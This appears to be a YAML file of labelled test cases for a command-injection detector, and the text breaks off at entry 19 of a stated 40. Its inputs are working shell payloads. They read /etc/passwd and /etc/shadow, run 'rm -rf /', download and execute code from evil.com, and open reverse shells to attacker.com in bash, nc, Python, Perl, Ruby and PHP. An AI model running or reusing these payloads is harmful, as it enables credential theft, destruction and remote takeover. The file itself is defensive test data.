  # Command Injection - 40 scenarios
  - id: cmdi_001
    category: cmdi
    subcategory: shell
    input: "| cat /etc/passwd"
    expected: 1
    difficulty: easy
    description: "Pipe to cat command"
  
  - id: cmdi_002
    category: cmdi
    subcategory: shell
    input: "; ls -la"
    expected: 1
    difficulty: easy
    description: "Semicolon command separator"
  
  - id: cmdi_003
    category: cmdi
    subcategory: shell
    input: "$(whoami)"
    expected: 1
    difficulty: easy
    description: "Command substitution with $()"
  
  - id: cmdi_004
    category: cmdi
    subcategory: shell
    input: "`id`"
    expected: 1
    difficulty: easy
    description: "Command substitution with backticks"
  
  - id: cmdi_005
    category: cmdi
    subcategory: shell
    input: "& ping -c 10 127.0.0.1"
    expected: 1
    difficulty: easy
    description: "Ampersand background execution"
  
  - id: cmdi_006
    category: cmdi
    subcategory: shell
    input: "; rm -rf /"
    expected: 1
    difficulty: hard
    description: "Destructive rm command"
  
  - id: cmdi_007
    category: cmdi
    subcategory: shell
    input: "|| cat /etc/shadow"
    expected: 1
    difficulty: medium
    description: "OR operator for command chaining"
  
  - id: cmdi_008
    category: cmdi
    subcategory: shell
    input: "&& cat /etc/hosts"
    expected: 1
    difficulty: medium
    description: "AND operator for command chaining"
  
  - id: cmdi_009
    category: cmdi
    subcategory: powershell
    input: "; Get-Process"
    expected: 1
    difficulty: easy
    description: "PowerShell Get-Process"
  
  - id: cmdi_010
    category: cmdi
    subcategory: powershell
    input: "| Get-ChildItem"
    expected: 1
    difficulty: easy
    description: "PowerShell Get-ChildItem"
  
  - id: cmdi_011
    category: cmdi
    subcategory: shell
    input: "; curl http://evil.com/shell.sh | bash"
    expected: 1
    difficulty: hard
    description: "Remote shell download and execution"
  
  - id: cmdi_012
    category: cmdi
    subcategory: shell
    input: "; wget http://evil.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd"
    expected: 1
    difficulty: hard
    description: "Wget backdoor installation"
  
  - id: cmdi_013
    category: cmdi
    subcategory: shell
    input: "; nc -e /bin/sh attacker.com 4444"
    expected: 1
    difficulty: hard
    description: "Netcat reverse shell"
  
  - id: cmdi_014
    category: cmdi
    subcategory: shell
    input: "; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
    expected: 1
    difficulty: hard
    description: "Bash TCP reverse shell"
  
  - id: cmdi_015
    category: cmdi
    subcategory: shell
    input: "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    expected: 1
    difficulty: hard
    description: "Python reverse shell"
  
  - id: cmdi_016
    category: cmdi
    subcategory: shell
    input: "; perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    expected: 1
    difficulty: hard
    description: "Perl reverse shell"
  
  - id: cmdi_017
    category: cmdi
    subcategory: shell
    input: "; ruby -rsocket -e'f=TCPSocket.open(\"attacker.com\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    expected: 1
    difficulty: hard
    description: "Ruby reverse shell"
  
  - id: cmdi_018
    category: cmdi
    subcategory: shell
    input: "; php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    expected: 1
    difficulty: hard
    description: "PHP reverse shell"
  
  - id: cmdi_019
    category: cmdi
    subcategory: shell
